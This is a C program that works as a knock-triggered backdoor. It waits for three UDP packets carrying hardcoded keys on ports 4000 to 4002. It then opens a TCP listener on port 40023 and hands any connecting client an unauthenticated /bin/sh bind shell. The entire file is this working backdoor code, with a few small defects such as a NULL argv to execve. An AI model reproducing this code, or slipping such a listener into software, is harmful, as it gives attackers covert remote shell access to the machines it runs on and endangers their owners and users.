#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#define MYPORT "4950"
#define MYPORT2 "4967"
#define MAXBUFLEN 100


// get sockaddr, IPv4 or IPv6
void *get_in_addr(struct sockaddr *sa) {
	if(sa->sa_family == AF_INET) {
		return &(((struct sockaddr_in*)sa)->sin_addr);
	}

	return &(((struct sockaddr_in6*)sa)->sin6_addr);
}

int bind_shell() {
	int fd, sockfd;
	int port = 40023;
	int one = 1;
	
	//char *args[] = {"/bin/sh" "-i"};
	struct sockaddr_in addr;

	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = INADDR_ANY;

	bind(sockfd, (struct sockaddr *) &addr, sizeof(addr));

	listen(sockfd, 0);

	fd = accept(sockfd, NULL, NULL);

	dup2(fd, 2);
	dup2(fd, 1);
	dup2(fd, 0);

	execve("/bin/sh", NULL, NULL);

	return 0;
}

int main(void) {
	struct addrinfo hints, *serv, *p;
	int rv, numbytes, sockfd;
	struct sockaddr_storage their_addr;
	char buf[MAXBUFLEN];
	socklen_t addr_len;
	char s[INET6_ADDRSTRLEN];

	char *ports[] = {"4000","4001","4002"};
	char *keys[] = {"key1","key2","key3"};

	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_DGRAM;
	hints.ai_flags = AI_PASSIVE;

	printf("%d\n", sizeof(ports));	

	for(int i=0;i<(sizeof(ports)/sizeof(ports[0]));i++) {
		if((rv = getaddrinfo(NULL, ports[i], &hints, &serv)) !=0) {
			fprintf(stderr, "gettaddrinfo: %s\n", gai_strerror(rv));
			return 1;
		}
	
		if(serv == NULL) {
			perror("failed to bind");
			return 2;
		}

		if((sockfd = socket(serv->ai_family, serv->ai_socktype,
					serv->ai_protocol)) == -1) {
			perror("listener: socket");
			exit(1);
		}
		if(bind(sockfd, serv->ai_addr, serv->ai_addrlen) == -1) {
			close(sockfd);
			perror("bind");
			exit(1);
		}

		freeaddrinfo(serv);

		printf("listerner: waiting to recvfrom...\n");

		addr_len = sizeof(their_addr);
		if ((numbytes = recvfrom(sockfd, buf, MAXBUFLEN-1, 0,
			(struct sockaddr *)&their_addr, &addr_len)) ==-1) {
			perror("recvfrom");
			exit(1);
		}

		buf[numbytes] = '\0';
		if(strncmp(keys[i], buf, numbytes) == 0) {
			printf("correct\n");
			if(i>1) {
				printf("now bind\n");
				bind_shell();
			}
		}

	}

	close(sockfd);

	return 0;
}




